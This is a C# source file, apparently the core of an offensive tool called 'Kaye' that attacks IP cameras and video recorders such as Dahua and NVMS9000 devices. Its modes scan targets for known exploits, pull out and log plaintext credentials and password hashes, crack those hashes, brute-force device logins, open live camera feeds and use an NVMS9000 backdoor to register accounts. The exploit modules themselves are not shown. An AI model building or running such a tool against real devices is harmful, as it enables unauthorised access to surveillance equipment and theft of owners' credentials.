using System;

using Kaye.Static;
using Kaye.Models;
using Kaye.Commands;
using Kaye.Profiles;
using Kaye.Exploits;
using Kaye.Arguments;
using Kaye.BruteForce;
using Kaye.Cryptography;

namespace Kaye
{
    public class Kaye
    {
        public KayeArguments Args;
        public KayeCommandScope Scope;
        public Model Model;
        public String Log = String.Empty;
        public String SerialNum;
        public ExploitScanner EScan;
        public Profile[] HashProfiles;

        public Kaye(KayeArguments Args)
        {
            this.Args = Args;
        }

        public void Run()
        {
            ShortMD5.Load();

            if (Args.Mode == Mode.Broken) Console.WriteLine(StaticContent.Broken);
            if (Args.Mode == Mode.Help) Console.WriteLine(StaticContent.Help);
            if (Args.Mode == Mode.Spoof) Console.WriteLine(StaticContent.Spoof);
            if (Args.Mode == Mode.Exploit || Args.Mode == Mode.StealthExploit)
            {
                Log += "TARGET:" + Args.Target.ToString() + "\r\n";
                Scope = new KayeCommandScope();
                Boolean TryCreds = Args.Mode == Mode.Exploit;
                ExploitScanner Scanner = new ExploitScanner(Args.Target);
                this.EScan = Scanner;
                Scanner.OnModelFound += AnnounceModel;
                Scanner.OnExploitFound += AnnounceExploit;
                Scanner.OnCredentialsFound += AnnounceCredentials;
                Console.WriteLine("\n{0}Starting exploit scanner...", StaticContent.KayePrefix);
                Scanner.Scan(TryCreds);
                Console.WriteLine("{0}Scan finished with {1} exploit{2} found.", StaticContent.KayePrefix, Scanner.Exploits.Length, Scanner.Exploits.Length == 1 ? String.Empty : "s");
                if (Scanner.CameraList != null && Scanner.CameraList.Length != 0)
                {
                    Console.Write("{0}Camera names: ", StaticContent.KayePrefix);
                    for (Int32 i = 0; i < Scanner.CameraList.Length; i++) Console.Write(Scanner.CameraList[i] + (i == Scanner.CameraList.Length - 1 ? "." : ", "));
                    Console.WriteLine();
                }
                if (Scanner.Info != null && Scanner.Info.Length != 0) Console.WriteLine("{0}Device info: {1}", StaticContent.KayePrefix, Scanner.Info);

                Boolean Hashes = false;
                Int32 HashCount = 0, CurrentCount = 0;

                for (Int32 i = 0; i < Scanner.Profiles.Length; i++)
                {
                    if (Scanner.Profiles[i].Algorithm == HashAlg.None) Log += "CREDS:" + Scanner.Profiles[i].Username + ":" + Scanner.Profiles[i].Password + "\r\n";
                    else
                    {
                        Log += "HASH:" + Scanner.Profiles[i].Username + ":" + Scanner.Profiles[i].Hash + ":" + Scanner.Profiles[i].Algorithm + "\r\n";
                        Hashes = true;
                        HashCount++;
                    }
                }

                this.HashProfiles = new Profile[HashCount];

                for (Int32 i = 0; i < Scanner.Profiles.Length; i++)
                    if (Scanner.Profiles[i].Algorithm != HashAlg.None)
                    {
                        HashProfiles[CurrentCount] = Scanner.Profiles[i];
                        CurrentCount++;
                    }

                this.SerialNum = Scanner.SerialNum;
                if (Scanner.SerialNum != null && Scanner.SerialNum.Length != 0) Log += "SERIALNUM:" + Scanner.SerialNum + "\r\n";

                Scope.Push(KayeCommandType.Export);
                Scope.Push(KayeCommandType.Exit);
                if (Hashes) Scope.Push(KayeCommandType.Hash);
                if (Scanner.Profiles.Length != 0 && Model == Model.Dahua && (Scanner.Profiles[0].Algorithm == HashAlg.DahuaMD5 || Scanner.Profiles[0].Algorithm == HashAlg.None)) Scope.Push(KayeCommandType.Live);
                if (Scanner.IsExploitPresent(ExploitType.NVMS9000Backdoor)) Scope.Push(KayeCommandType.Register);

                KayeCommandExecutor Executor = new KayeCommandExecutor(this);
                Executor.ShowCommands();
                Executor.Start();
            }
            if (Args.Mode == Mode.Hash && Args.TargetHashes != null)
            {
                Log += "TARGET:" + Args.Target.ToString() + "\n";
                this.SerialNum = Args.SerialNum;
                Scope = new KayeCommandScope();

                Console.WriteLine("\n{0}Starting Kaye in hash breaker mode...", StaticContent.KayePrefix);
                if (Args.TargetHashes.Length == 0) { Console.WriteLine("{0}No hashed profiles found!", StaticContent.KayePrefix); return; }
                Console.WriteLine("{0}Loaded {1} hashed profiles.", StaticContent.KayePrefix, Args.TargetHashes.Length);

                Scope.Push(KayeCommandType.Exit);
                Scope.Push(KayeCommandType.Import);
                Scope.Push(KayeCommandType.CurrentFile);
                Scope.Push(KayeCommandType.List);
                Scope.Push(KayeCommandType.Dictionary);

                KayeCommandExecutor Executor = new KayeCommandExecutor(this);
                Executor.ShowCommands();
                Executor.Start();
            }
            if (Args.Mode == Mode.Brute)
            {
                this.Scope = new KayeCommandScope();
                ModelScanner Scanner = new ModelScanner();
                this.Model = Scanner.Scan(Args.Target);
                AnnounceModel(this.Model);

                if (!LoginMaker.IsModelImplemented(Model)) { Console.WriteLine("{0}Brute-force attacks aren't build-in for this model!", StaticContent.KayePrefix); return; }

                if (this.Model == Model.Dahua) Console.WriteLine("{0}WARNING: This model may have a login counter!.", StaticContent.KayePrefix);

                Scope.Push(KayeCommandType.Exit);
                Scope.Push(KayeCommandType.Import);
                Scope.Push(KayeCommandType.CurrentFile);
                Scope.Push(KayeCommandType.Dictionary);

                KayeCommandExecutor Executor = new KayeCommandExecutor(this);
                Executor.ShowCommands();
                Executor.Start();
            }
        }

        private void AnnounceModel(Model Model)
        {
            this.Model = Model;
            Log += "MODEL:" + Model + "\r\n";
            if (Model == Model.None) { Console.WriteLine("{0}Device model is unknown.", StaticContent.KayePrefix); Environment.Exit(0); }
            else Console.WriteLine("{0}Device is {1}.", StaticContent.KayePrefix, Model);
        }

        private void AnnounceExploit(Exploit Exploit)
        {
            Console.WriteLine("{0}Exploit {1} is present.", StaticContent.KayePrefix, Exploit.GetMessage());
        }

        private void AnnounceCredentials(String Username, String Password)
        {
            Console.WriteLine("{0}Found login credentials! Username: {1}. Password: {2}.", StaticContent.KayePrefix, Username, Password);
        }
    }
}